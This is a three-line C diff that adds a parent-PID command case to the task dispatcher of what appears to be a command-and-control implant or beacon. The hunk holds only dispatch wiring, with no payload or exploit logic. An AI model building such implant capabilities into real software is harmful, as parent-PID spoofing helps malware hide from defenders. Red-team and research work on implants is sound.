@@ -80,6 +80,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_JOB_SPAWN_TOKEN_X64:
 			JobSpawn(buffer, size, FALSE, FALSE);
 			break;
+		case COMMAND_PPID:
+			RunSetParentPid(buffer, size);
+			break;
 	}
 }
 
